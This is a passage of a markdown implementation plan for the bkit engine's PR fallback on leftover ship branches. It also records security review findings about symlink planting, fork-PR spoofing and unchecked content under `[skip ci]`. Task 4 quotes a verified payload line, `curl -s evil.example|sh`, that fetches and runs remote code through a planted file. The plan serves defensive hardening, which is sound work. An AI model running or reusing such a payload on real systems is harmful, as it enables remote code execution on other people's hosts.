| deployments | `docs/deployments.md` | yes — PR fallback behaviour | `docs/deployments.md` § Autonomous phase-close prerequisites (line 138), § Consumer rollback path (line 357) | covered | Task 3 adds the leftover-branch clause. |
| data-schema | `docs/data-schema.md` | no — no database | none | none | Not applicable. |
| design | `docs/design.md` | no — no UI | none | none | Not applicable. |
| observability | `docs/observability.md` | no — one failure-reason string, no new log name or span | none | none | Not applicable. |
| noise | `docs/noise.md` | no — no signal downgrade | none | none | Not applicable. |
| setup | `docs/setup.md` | no — no local-setup change | none | none | Not applicable. |

## Documentation Warnings

None

## Data Schema Integration

None — no database. The change reads and writes git branches and `.jsonl` ledger files only.

### Data Schema Usage

None

### Data Schema Changes

None

## Reuse Inventory

<!-- prettier-ignore -->
| Capability | File | Search performed | Existing candidates | Decision | Justification |
| --- | --- | --- | --- | --- | --- |
| Build a PR-fallback commit on a branch an earlier attempt left; reuse its open PR | `.bkit/core/engine/commands/workflow/workflows.ts` | `grep -n closePr .bkit/core/engine/commands/workflow/workflows.ts`; read `closePr` (line 1675) and its two callers (lines 954, 1754) | `closePr` — pushes, creates a PR and merges; missing the leftover-tip merge and the open-PR reuse | EXTEND | Add the origin read, the leftover-tip merge and the `probePr` reuse inside `closePr`; both callers already map `{ failed }` to their exit code. |
| Put back the ledger rows a `-X ours` merge dropped | `.bkit/core/engine/commands/workflow/branches.ts` | `grep -n restoreBranchRows .bkit/core/engine/commands/workflow/branches.ts`; read lines 2915-2950 | `restoreBranchRows` — takes any revision as `branch`; it is not exported | EXTEND | Export it and call it from `closePr` instead of a second copy. |
| Refuse a leftover tip that changes files outside the bookkeeping paths | `.bkit/core/engine/commands/ci/ci.ts` | `grep -n 'minPushOutside\|minPushPathspecs' .bkit/core/engine/commands/ci/ci.ts .bkit/core/engine/commands/land.ts` | `minPushOutside` and `minPushPathspecs` — exported; `checkLanding` in `land.ts` (line 197) already runs them on every landing | EXTEND | Call the same pair from `closePr`; no change to `ci.ts`. |
| Link an unmerged flush's handover comment at the pushed commit | `.bkit/core/engine/commands/workflow/workflows.ts` | `grep -n linkRef .bkit/core/engine/commands/workflow/*.ts`; read `landFailedRecord` (line 905), `handoverVerb` (line 1105) and `buildComment`'s `blob/{ref}` URL (line 1404) | `landFailedRecord`'s `linkRef` — `DEV` for a merged PR, the branch name otherwise; `closePr` already holds the pushed SHA as `head` | EXTEND | `closePr` returns the SHA; `linkRef` becomes that SHA for an unmerged PR. `buildComment` takes any ref, so it needs no change. |
| Test stub for a leftover branch, an open or absent PR, and a failing `pr create` or `pr merge` | `.bkit/core/engine/commands/workflow/workflows.test.ts` | `grep -n ghStub .bkit/core/engine/commands/workflow/workflows.test.ts`; read lines 2434-2465 | `ghStub(head, base)` — always answers one open PR; `pr create` and `pr merge` always succeed | EXTEND | Add an options argument; the existing calls keep their behaviour. |

## Architecture & Component Changes

**Ledger rows:** `docs/decisions.jsonl` key `811-leftover-ship-failed-branch-is-an-assumed-accept` (a same-`key` `SUPERSEDED` row appended in Task 3). `docs/deferrals.jsonl` key `811-publish-dev-refused-challenge-low-bkit-core-engine-commands-workflow-workflows-ts-1509` and `...-ts-830` (each closed with a `CLOSED` row appended through `bkit ledgers append`, in Task 1 and Task 2).

### Database Migrations

None

### Backend (engine)

#### [MODIFY] `.bkit/core/engine/commands/workflow/workflows.ts`

- **Existence Check:** the file exists; `closePr` at line 1675.
- Before the push, read the branch tip with `git ls-remote --exit-code origin refs/heads/{branch}` (exit 2 = no branch, as today; any other failure returns `{ failed: "cannot read origin's {branch}" }`).
- When a tip exists: fetch it, refuse it when `minPushOutside(...)` lists any `outside` path, run `git merge --no-commit -X ours {tip}`, call `restoreBranchRows` while `MERGE_HEAD` is set, then `git commit --no-edit`. A merge that stops on a clash returns `{ failed }` naming the branch and tip.
- Take `head` after the merge so `mergePr` gets `--match-head-commit` at the pushed tip. Call `probePr` with `state: "open"` before `gh pr create` and skip the create when it finds a PR. A `gh pr create` failure names the pushed branch.
- Update the `closePr` doc comment.
- `closePr` returns the pushed commit's SHA (`head`) with `ref` and `via`; `landFailedRecord` sets `linkRef` to that SHA when `via` is `close-pr-open`, and to `DEV` when `via` is `close-pr`, as today. The `linkRef` doc comment says so.

#### [MODIFY] `.bkit/core/engine/commands/workflow/branches.ts`

- **Existence Check:** the file exists; `restoreBranchRows` at line 2924.
- Export `restoreBranchRows`.

#### [MODIFY] `.bkit/core/engine/commands/workflow/workflows.test.ts`

- **Existence Check:** the file exists.
- Extend `ghStub` and add the eight tests of the Derived Test Matrix.

### Documentation

#### [MODIFY] `.bkit/core/.bkit/workflows.md`, `docs/deployments.md`, `docs/testing.md`, `docs/decisions.jsonl`

- **Existence Check:** all four exist.
- The leftover-branch clause, the testing row and the superseding decision row (Task 3).

### Cron Jobs & Scheduled Tasks

None

## Supersession Inventory

<!-- prettier-ignore -->
| Existing artifact | Replaced by | Decision | Justification |
| --- | --- | --- | --- |
| The unconditional `gh pr create` in `closePr`, which fails whenever an open PR already exists for the branch | `probePr` check before the create | DELETE | The create runs only when no open PR exists. |
| `docs/decisions.jsonl` key `811-leftover-ship-failed-branch-is-an-assumed-accept` | A same-`key` `SUPERSEDED` row | DELETE | The limit it records no longer holds. |

## Documentation Updates

<!-- prettier-ignore -->
| Doc | Change required |
| --- | --- |
| `docs/decisions.jsonl` | Supersede `811-leftover-ship-failed-branch-is-an-assumed-accept` through `bkit ledgers append`. |
| `docs/testing.md` | The `commands/workflow/workflows.test.ts` row adds the leftover-branch PR fallback for close and flush. |
| `docs/deployments.md` | § Autonomous phase-close prerequisites and § Consumer rollback path: a leftover branch is merged in and its open PR reused. |
| `.bkit/core/.bkit/workflows.md` | The same clause at each `ship-close/{FID}` and `ship-failed/{FID}` PR line; `.bkit/workflows.md` re-rendered by `bkit upgrade`. |

## Rollback Strategy

Code-only — `git revert` sufficient. Reverting restores the plain push, which fails when a leftover branch exists, as before.

## Agent Execution Runbook

<!-- bkit:group 1 start -->

### TASK GROUP 1: Publish onto a branch an earlier attempt left

<!-- bkit:task 1 start -->

- [x] **TASK 1:** Merge a leftover branch tip into the record and reuse its open PR
  - **UPDATE:** `closePr` in `.bkit/core/engine/commands/workflow/workflows.ts`: before the push, read the branch tip with `git ls-remote --exit-code origin refs/heads/{branch}` (exit 2 = no branch, as today; any other failure → `{ failed: "cannot read origin's {branch}" }`)
  - **UPDATE:** `closePr` in `.bkit/core/engine/commands/workflow/workflows.ts`: when a tip exists, fetch it, refuse it when `minPushOutside(dir, mergeBase, tip, minPushPathspecs(readBkitConfig(dir)))` lists any `outside` path (failure names the branch and the paths), then `git merge --no-commit -X ours {tip}`, put back the tip's ledger rows, and `git commit --no-edit`; a merge that stops on a clash returns `{ failed }` naming the branch and tip
  - **UPDATE:** `closePr` in `.bkit/core/engine/commands/workflow/workflows.ts`: take `head` after the merge, so `mergePr` gets `--match-head-commit` set to the pushed tip; call `probePr(dir, { head: branch, base: DEV, state: "open" })` before `gh pr create`, and skip the create when it finds a PR; a `gh pr create` failure names the pushed branch
  - **UPDATE:** `restoreBranchRows` in `.bkit/core/engine/commands/workflow/branches.ts`: export it so `closePr` reuses it instead of a second copy; its `branch` argument is any revision, and it must run while `MERGE_HEAD` is set (after `--no-commit`, before the commit), because once the merge commit exists, the merge base with the tip is the tip itself
  - **UPDATE:** `closePr` in `.bkit/core/engine/commands/workflow/workflows.ts`: the doc comment says it builds on a branch an earlier attempt left
  - **UPDATE:** `ghStub` in `.bkit/core/engine/commands/workflow/workflows.test.ts`: an options argument so `pr list` answers `[]` until `pr create` has run (or an open PR throughout), `pr create` can exit 1, and `pr merge` can exit 1; existing calls keep their behaviour
  - **UPDATE:** `docs/deferrals.jsonl`: for key `811-publish-dev-refused-challenge-low-bkit-core-engine-commands-workflow-workflows-ts-1509`, append a same-`key` row with `status: "CLOSED"` and `references` naming #1042 through `bkit ledgers append` (`.bkit/jsonl.md` § Write Idiom, § Updating a Row), after its test passes
  - **READ:** `minPushOutside` in `.bkit/core/engine/commands/ci/ci.ts`: the check `closePr` reuses, with `minPushPathspecs` in the same file
  - **READ:** `pushToDev` in `.bkit/core/engine/commands/land.ts`: the `refused` handler runs inside `withoutHooks`, so the merge commit runs no hook, and the throwaway checkout is dropped on every path
  - **READ:** `shipClose` in `.bkit/core/engine/commands/workflow/workflows.ts`: needs no change; it and `landFailedRecord` already map `{ failed }` to their exit code
  - **READ:** `docs/testing.md`: § Key test files, the boundary-test tier the new tests follow
  - **DONE WHEN:** `pnpm vitest run .bkit/core/engine/commands/workflow/workflows.test.ts .bkit/core/engine/commands/workflow/branches.test.ts` passes, the existing tests `closePr with base dev still merges`, `closePr refuses when the PR base is unknown` and `--flush refused by dev publishes the FAILED record through a PR` pass unchanged, and `pnpm build` has refreshed `dist/`, and the `...-1509` deferral has a `CLOSED` row
  - **TEST FIRST:**
    - `.bkit/core/engine/commands/workflow/workflows.test.ts` `--flush refused by dev twice for one FID publishes the second record through a PR` fails on the second flush exiting 10 with "close branch push failed for ship-failed" (the first flush leaves an open PR; the second, with a new ledger row, must exit 0 with `pushed: true`, the first tip an ancestor of the new tip on the remote, both rows on the branch, and one `pr create` call)
    - `.bkit/core/engine/commands/workflow/workflows.test.ts` `--flush refused by dev with ship-failed left on origin and no PR opens one PR on that branch` fails on exit 10 (a FAILED record commit from an older `dev` sits on `ship-failed/{FID}`; it expects exit 0, one `pr create --head ship-failed/{FID}`, and the earlier record's log file still on the branch tip)
    - `.bkit/core/engine/commands/workflow/workflows.test.ts` `--flush refused by dev with a squash-merged ship-failed tip left on origin lands the new record` fails on exit 10 (the leftover tip's change is also committed to `dev` as a separate commit; it expects exit 0 and `git diff dev ship-failed/{FID} --name-only` on the remote to list only files the new record wrote)
    - `.bkit/core/engine/commands/workflow/workflows.test.ts` `--flush refused by dev does not merge a leftover tip that changes code` fails on the log not naming "src/app.ts" (the leftover tip changes `src/app.ts`; it expects exit 10, a log naming `ship-failed/{FID}` and `src/app.ts`, and the remote branch still at the leftover tip)
    - `.bkit/core/engine/commands/workflow/workflows.test.ts` `a second refused close for one FID reuses the open ship-close PR` fails on exit 11 with "close branch push failed for ship-close" (a leftover tip sits on `ship-close/{FID}` and `pr list` answers an open PR; it expects exit 0, `landed.ref` = `ship-close/{FID}`, and no `pr create` call)
    - `.bkit/core/engine/commands/workflow/workflows.test.ts` `--flush refused by dev with gh pr create failing names the pushed ship-failed branch` fails on the exit-10 log not holding "pr create failed for ship-failed" (`pr create` exits 1 after the branch push; the log must name `ship-failed/{FID}` as holding the record)

<!-- bkit:task 1 end -->

<!-- bkit:task 2 start -->

- [x] **TASK 2:** Link an unmerged flush's handover comment at the pushed commit
  - **UPDATE:** `closePr` in `.bkit/core/engine/commands/workflow/workflows.ts`: return the pushed commit's SHA (`head`, taken after the leftover-tip merge) next to `ref` and `via`, on both `close-pr` and `close-pr-open`
  - **UPDATE:** `landFailedRecord` in `.bkit/core/engine/commands/workflow/workflows.ts`: in the `refused` case, `linkRef` is `DEV` when `via` is `close-pr` (as today) and the returned SHA when `via` is `close-pr-open`; update the `linkRef` doc comment to say so
  - **UPDATE:** `docs/deferrals.jsonl`: for key `811-publish-dev-refused-challenge-low-bkit-core-engine-commands-workflow-workflows-ts-830`, append a same-`key` row with `status: "CLOSED"` and `references` naming #1042 through `bkit ledgers append` (`.bkit/jsonl.md` § Write Idiom, § Updating a Row), after its tests pass
  - **READ:** `handoverVerb` in `.bkit/core/engine/commands/workflow/workflows.ts`: `linkRef = r.linkRef ?? r.ref` feeds `buildComment`, whose URL is `blob/{ref}/{file}`; it takes any ref, so the SHA needs no change there
  - **READ:** `shipClose` in `.bkit/core/engine/commands/workflow/workflows.ts`: reads `via` only; the extra SHA field changes nothing for it
  - **DEPENDS ON:** 1
  - **DONE WHEN:** `pnpm vitest run .bkit/core/engine/commands/workflow/workflows.test.ts` passes; for a flush whose PR opened but did not merge, the handover comment's link is `blob/{sha}/...` with the SHA of the branch tip on the remote, so it opens before the merge and still opens after the head branch is deleted (GitHub keeps the commit reachable through the PR's `refs/pull/N/head`); a merged PR still links at `dev` (`--flush refused by dev links the handover comment at dev once the PR merged` passes unchanged); `pnpm build` has refreshed `dist/`; and the `...-830` deferral has a `CLOSED` row
  - **TEST FIRST:**
    - `.bkit/core/engine/commands/workflow/workflows.test.ts` `--flush refused by dev links the handover comment at the pushed commit when the PR did not merge` fails on the comment holding "/blob/ship-failed/" (`pr merge` exits 1; it expects `r.json.comment` to contain `/blob/{tip}/` with `{tip}` the `ship-failed/{FID}` tip on the remote, and not `/blob/ship-failed/`)
    - `.bkit/core/engine/commands/workflow/workflows.test.ts` `--flush refused by dev keeps the unmerged handover link readable after the branch is deleted` fails on the comment holding no SHA to read (`pr merge` exits 1; the test takes the SHA from the comment, deletes `ship-failed/{FID}` on the remote, and expects `git cat-file -e {sha}:{REL}/ship-handover.md` to succeed there)

<!-- bkit:task 2 end -->

<!-- bkit:task 3 start -->

- [x] **TASK 3:** Say that ship's PR fallback builds on a branch an earlier attempt left
  - **UPDATE:** `.bkit/core/.bkit/workflows.md`: § `/bkit-ship` — 12 steps (the close bullet, line 1128) and § Consumer rollback path (line 1354): a `ship-close/{FID}` or `ship-failed/{FID}` branch already on origin is merged into the new record, and its open PR is reused
  - **UPDATE:** `.bkit/core/.bkit/workflows.md`: the other `--flush` → `ship-failed/{FID}` PR lines (lines 131-132, 150 and 825) get the same clause where they name the PR
  - **UPDATE:** `docs/deployments.md`: § Consumer rollback path (line 357) and the `ship-failed/{FID}` sentence in § Autonomous phase-close prerequisites (line 138) get the same clause
  - **UPDATE:** `docs/testing.md`: § Key test files, the `commands/workflow/workflows.test.ts` row (line 965) adds the leftover-branch PR fallback for close and flush, and the unmerged flush's handover link at the pushed commit
  - **UPDATE:** `docs/decisions.jsonl`: for key `811-leftover-ship-failed-branch-is-an-assumed-accept`, append a same-`key` row with `status: "SUPERSEDED"` through `bkit ledgers append` (`.bkit/jsonl.md` § Write Idiom), naming this issue
  - **READ:** `.bkit/authoring.md`: § Which Sections Apply and § Before You Save, the rules for editing `.bkit/core/.bkit/workflows.md`
  - **DEPENDS ON:** 1, 2
  - **DONE WHEN:** no line in those files says a refused close or flush fails when its branch is already on origin, the `811-leftover-...` key has a `SUPERSEDED` row, and `pnpm tsx .bkit/core/engine/cli.ts upgrade` has re-rendered `.bkit/workflows.md`
  - **TEST FIRST:** n/a — docs and a ledger row only

<!-- bkit:task 3 end -->

<!-- bkit:group 1 end -->

<!-- bkit:group 2 start -->

### TASK GROUP 2: Challenge round 1 findings

<!-- bkit:task 4 start -->

- [x] **TASK 4:** Anyone who can push `ship-failed/{FID}` plants a symlinked `.jsonl` in the run's log folder, and the refused flush's `restoreBranchRows` follows it, creating a file outside the checkout at a path and with lines the attacker chose (a `.pth` or `profile.d` file runs code on the ship host)
      **Severity:** CRITICAL · **Class:** mechanical · **Fixable:** true · **Location:** `.bkit/core/engine/commands/workflow/workflows.ts:1711` · **Round:** 1
  - **DONE WHEN:** `closePr` refuses a leftover tip whose `mergeBase..tip` diff adds or changes any entry that is not a regular file (mode `120000` symlink or `160000` gitlink): nothing is merged or pushed, the failure names the branch and the paths, and the exit code is 10 for the flush and 11 for the close. `restoreBranchRows` also never writes through a symlink: it `lstat`s each target, skips anything that is not a regular file, and checks that the resolved path stays inside `dir`, as `prepareLandInputs` in `.bkit/core/engine/commands/land.ts` does. Verified in this challenge: the real `dist/` `minPushOutside` returns `outside: []` for `docs/plans/m/logs/f/evil.jsonl` as a symlink, `git merge --no-commit -X ours` checks it out, and the real `restoreBranchRows` created `{outside}/x<newline>curl -s evil.example|sh` with that payload line as its content.
  - **TEST FIRST:**
    - `.bkit/core/engine/commands/workflow/workflows.test.ts` `--flush refused by dev does not merge a leftover tip that adds a symlinked ledger` fails on the flush exiting 0 and the file at the symlink's target outside the repo existing (the leftover tip adds `${REL}/evil.jsonl` as a symlink to `{tmp outside dir}/planted`; it expects exit 10, a log naming `ship-failed/{FID}` and `evil.jsonl`, the remote branch still at the leftover tip, and no `{tmp outside dir}/planted`)
    - `.bkit/core/engine/commands/workflow/branches.test.ts` `restoreBranchRows writes nothing through a symlinked ledger` fails on `restoreBranchRows` creating the symlink's target (a repo with a `-X ours` merge open whose tip adds a `.jsonl` symlink to a missing file in a temp dir; it expects that file to stay absent after the call)

<!-- bkit:task 4 end -->
<!-- bkit:task 5 start -->

- [x] **TASK 5:** An outsider opens a fork PR whose head branch is named `ship-failed/{FID}`; the refused flush takes it as the leftover branch's open PR, creates no PR of its own, and logs "close PR #N opened but not merged — merge it by hand", pointing the operator at the attacker's PR
      **Severity:** HIGH · **Class:** mechanical · **Fixable:** true · **Location:** `.bkit/core/engine/commands/workflow/workflows.ts:1722` · **Round:** 1
  - **DONE WHEN:** `closePr` reuses an open PR only when it comes from this repository (`isCrossRepository` false, read through `PR_FIELDS` in `.bkit/core/engine/commands/workflow/prs.ts`) and its `headRefName` is `branch`. When the only open PRs listed are fork PRs, `closePr` runs `gh pr create` and merges its own PR. `gh pr list --head` matches by branch name alone, so fork PRs with the same name are listed too. `probePr` picks `prs[0]` with no repository check, which breaks the rule in `docs/security.md` § CI Auto-Route Trust (bkit-cloud) that fork PRs are not collaborator-trusted and are filtered out before use.
  - **TEST FIRST:**
    - `.bkit/core/engine/commands/workflow/workflows.test.ts` `--flush refused by dev with a fork PR on the ship-failed branch name opens its own PR` fails on `pr create` never running (a leftover `ship-failed/{FID}` tip sits on origin, and the `ghStub` `pr list` answers PR 7 with `"isCrossRepository":true` and a `headRefOid` that is not the tip until `pr create` runs; it expects one `pr create --head ship-failed/{FID}` call and no `pr merge 7` call)

<!-- bkit:task 5 end -->
<!-- bkit:task 6 start -->

- [x] **TASK 6:** A second refused flush pushes a `Merge commit '<sha>'` head with no `[skip ci]`, so the reused `ship-failed/{FID}` PR runs the full CI on every later attempt
      **Severity:** MEDIUM · **Class:** mechanical · **Fixable:** true · **Location:** `.bkit/core/engine/commands/workflow/workflows.ts:1712` · **Round:** 1
  - **DONE WHEN:** The merge commit `closePr` makes over a leftover tip carries the record's `subject` (`chore({FID}): {workflow} FAILED bkit [skip ci]` / `docs({FID}): ship DONE bkit [skip ci]`) as its message, so the pushed branch head keeps the skip token exactly as a first attempt's record commit does, and GitHub starts no `pull_request` run for the PR (`docs/knowledge.jsonl` key `kn-11-pr-statuscheckrollup-stays-empty-when-skip-ci-is-head`; `.bkit/templates/.github/workflows/bkit-ci.yml` runs on `pull_request` to `dev`).
  - **TEST FIRST:**
    - `.bkit/core/engine/commands/workflow/workflows.test.ts` `--flush refused by dev onto a leftover ship-failed branch keeps the skip token on the pushed head` fails on `git log -1 --format=%s ship-failed/{FID}` on the remote reading `Merge commit '<sha>'` with no `[skip ci]` (`git commit --no-edit` writes git's default merge subject; a scratch repo run of the same `merge --no-ff --no-commit -X ours` + `commit --no-edit` printed `Merge commit '203d597c...' into dev`)

<!-- bkit:task 6 end -->
<!-- bkit:task 7 start -->

- [x] **TASK 7:** A reused open PR is merged with `--match-head-commit` straight after the branch push, before GitHub has moved the PR's head to the pushed tip, so GitHub refuses the merge and the record waits for a human
      **Severity:** MEDIUM · **Class:** mechanical · **Fixable:** true · **Location:** `.bkit/core/engine/commands/workflow/workflows.ts:1747` · **Round:** 1
  - **DONE WHEN:** On the reuse path (`open` found an open PR), `closePr` re-reads the PR (`probePr` by number, `headRefOid` is in `PR_FIELDS`) within a bounded wait until `headRefOid` equals the pushed `head`, and only then calls `mergePr`; a head that never arrives within the bound still ends as `close-pr-open`, as today. The create path is unchanged, because `gh pr create` runs after the push and GitHub reads the head then.
  - **TEST FIRST:**
    - `.bkit/core/engine/commands/workflow/workflows.test.ts` `a second refused close waits for the reused PR head to reach the pushed tip before merging` fails on the close ending with `landed.via` `close-pr-open` (gh stub: `pr list` / `pr view` answer the leftover tip as `headRefOid` on the first read and the pushed tip after, and `pr merge --match-head-commit {sha}` exits 1 with `Head branch was modified` until a read has answered `{sha}`; it expects `landed` `{ ref: ship-close/{FID}, via: close-pr }` and one successful `pr merge`)

<!-- bkit:task 7 end -->
<!-- bkit:task 8 start -->

- [x] **TASK 8:** Anyone who can push `ship-failed/{FID}` or `ship-close/{FID}` gets a new skill (`.claude/skills/x/SKILL.md` plus scripts), a `skills-lock.json` source, a `docs/*.md` rule or a `.bkit/issues.jsonl` `SHIPPED` row onto `dev`, inside bkit's own `[skip ci]` record commit, because the leftover-tip check allows every min-push path instead of the paths a record holds
      **Severity:** MEDIUM · **Class:** mechanical · **Fixable:** true · **Location:** `.bkit/core/engine/commands/workflow/workflows.ts:1700` · **Round:** 1
  - **DONE WHEN:** `closePr` checks a leftover tip against the record's own paths: the run's log folder `docs/plans/*/logs/{FID}/*` and the ledger globs in `UNION_PATHSPECS` (`.bkit/core/engine/commands/workflow/ledgers.ts`), including its `:(exclude).bkit/issues.jsonl`. It does not use `minPushPathspecs`, whose `bookPathspecs(..., "pr")` entries `.claude/skills/*`, `.agents/skills/*`, `.cursor/skills/*`, `.opencode/skills/*`, `skills-lock.json`, `:(glob)docs/*.md`, `docs/roadmap.md` and `docs/audits/**` cover no file a ship record writes. A tip that touches any other path is refused, its failure names the branch and the paths, and the exit code is 10 or 11. A plain pathspec `*` crosses `/`, as the `bookPathspecs` doc comment and gitglossary say, so `.claude/skills/*` admits any file under a new skill folder. `.bkit/core/.bkit/workflows.md` states that a union never carries `.bkit/issues.jsonl` onto `dev`, and `docs/security.md` § Supply-Chain (GitHub Actions) accepts the unscanned `[skip ci]` risk for audit reports only.
  - **TEST FIRST:**
    - `.bkit/core/engine/commands/workflow/workflows.test.ts` `--flush refused by dev does not merge a leftover tip that adds a skill` fails on the flush exiting 0 with the skill on the branch (the leftover tip adds `.claude/skills/probe/SKILL.md`; it expects exit 10, a log naming `ship-failed/{FID}` and `.claude/skills/probe/SKILL.md`, and the remote branch still at the leftover tip)
    - `.bkit/core/engine/commands/workflow/workflows.test.ts` `--flush refused by dev does not merge a leftover tip that writes .bkit/issues.jsonl` fails on the flush exiting 0 with the `SHIPPED` row on the branch (the leftover tip adds a `SHIPPED` row to `.bkit/issues.jsonl`; it expects exit 10 and `git show ship-failed/{FID}:.bkit/issues.jsonl` on the remote to lack that row)

<!-- bkit:task 8 end -->
<!-- bkit:group 2 end -->

<!-- bkit:group 3 start -->

### TASK GROUP 3: Challenge round 1 findings

<!-- bkit:task 9 start -->

- [x] **TASK 9:** A leftover tip carrying content the landing gate would reject (a malformed ledger row, a home-directory path, or a secret a consumer's `bkit:gate:min` scans for) reaches `dev` unchecked: `checkLanding` gated only the record, the merge commit is pushed without a gate, and the `[skip ci]` squash subject means no CI runs after it either
      **Severity:** MEDIUM · **Class:** mechanical · **Fixable:** true · **Location:** `.bkit/core/engine/commands/workflow/workflows.ts:1719` · **Round:** 1
  - **DONE WHEN:** after the leftover-tip merge commit and before the branch push, `closePr` runs the same landing gate `checkLanding` in `.bkit/core/engine/commands/land.ts` picks (`bkit:gate:min` for min-push changes, through `runPushGate`) on the merged checkout. A failing or missing gate pushes nothing, its failure names the branch and the gate, and the exit code is 10 or 11. `.bkit/core/.bkit/workflows.md` § One landing routine for every dev write says that "failed checks and a changed landing tree stop the push", and `docs/security.md` § Supply-Chain (GitHub Actions) records that no workflow, the secret scan included, runs on a `[skip ci]` push to `dev`.
  - **TEST FIRST:**
    - `.bkit/core/engine/commands/workflow/workflows.test.ts` `--flush refused by dev runs the landing gate on a merged leftover tip` fails on the flush exiting 0 with the gate never run on the merge (`dev`'s `package.json` declares `bkit:gate:min` as `test ! -e {REL}/poison.md`, and the leftover tip adds `{REL}/poison.md`; it expects exit 10, a log naming `ship-failed/{FID}` and `bkit:gate:min`, and the remote branch still at the leftover tip)

<!-- bkit:task 9 end -->
<!-- bkit:group 3 end -->

### 🔒 Gate 2: Code Implementation Check

- [ ] **No bolt-on:** every `[NEW]` file traces to a `Reuse Inventory` `NEW` row.
- [ ] **Extensions landed:** every `EXTEND` landed in the artifact its row names.
- [ ] **No gate weakened:** no gate was weakened.
- [ ] **Red before code:** the tests step recorded every planned test of the group red, or as an `updated` existing test, before its code step ran. A later task that names an earlier task's test takes it over: the build reports the takeover and does not refuse it.
- [ ] **Tests unchanged:** every planned test case matches the lines its red row recorded, or a code step's `BLOCKED` line names the change for the owner.
- [ ] **Unproven tests:** each planned test with no proven red is cleared only by a human-committed `TEST EXCEPTION` field.
- [ ] **Gate 2 — Verified:** every box above is checked.

**Mandatory Tasks (Testing & Documentation):**

- [ ] **Verify test coverage against Derived Test Matrix:** each row's test is in one task's `DONE WHEN`.
- [ ] **Sweep existing tests:** broken tests are fixed, and the full suite passes.
- [ ] **Sweep new tests:** every test a task's `DONE WHEN` names exists and passes.
- [ ] **Verify observability:** errors are logged and traced as `docs/observability.md` describes.
- [ ] **Update documentation:** the affected docs are rewritten to match.

### 🔒 Gate 3: Testing & Documentation Check

- [ ] **Docs updated:** every `Documentation Updates` row is done.
- [ ] **Docs index accurate:** `.agents/docs.md` is accurate.
- [ ] **Gate 3 — Verified:** every box above is checked.

## Verification Plan

### Automated Tests

- [ ] **Full Local Gate Suite:** the deepest declared `bkit:gate:*` script and `bkit check` pass.
- [ ] **Test Synchronization:** `.bkit/core/engine/commands/workflow/workflows.test.ts` and `branches.test.ts` pass.
- [ ] **Run all tests:** the local unit suite passes.

### 🔒 Gate 4: Automated Verification Check

- [ ] **Gate 4 — Verified:** every Automated Tests box is checked, with proof (test output, a CLI result or an API response).

### Manual Verification

> [!CAUTION]
> **Owner-run acceptance checks, advisory only.** An unticked box blocks nothing: not the merge, and not plan approval. This is not a Gate 1 human-confirmation section.

- [ ] **Step 1:** on a scratch consumer with a bare remote that refuses `dev`, leave a `ship-failed/{FID}` branch from one flush, run a second flush, and confirm exit 0 and one PR carrying both records.
